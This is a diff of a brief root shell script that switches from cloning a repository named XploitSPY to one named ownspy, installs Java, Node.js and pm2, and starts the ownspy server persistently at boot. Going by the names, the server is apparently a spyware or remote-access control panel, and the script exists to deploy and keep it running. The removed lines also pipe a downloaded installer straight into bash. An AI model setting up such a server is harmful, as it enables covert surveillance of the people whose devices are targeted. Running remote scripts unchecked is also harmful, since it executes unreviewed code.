@@ -1,10 +1,14 @@
 apt update -y
 apt upgrade -y
-git clone https://github.com/XploitWizer-Community/XploitSPY.git
-sudo apt-get install openjdk-11-jre
-# installs fnm (Fast Node Manager)
-curl -fsSL https://fnm.vercel.app/install | bash
-# download and install Node.js
-fnm use --install-if-missing 20
-# verifies the right Node.js version is in the environment
-node -v # should print `v20.14.0`
+cd /root/
+git clone https://github.com/Aniiket7/ownspy.git
+cd /root/ownspy
+sudo apt-get install openjdk-11-jre -y
+apt install nodejs -y
+apt install npm -y
+sudo npm install pm2 -g
+
+cd /root/ownspy/server/
+npm install
+pm2 start index.js
+pm2 startup
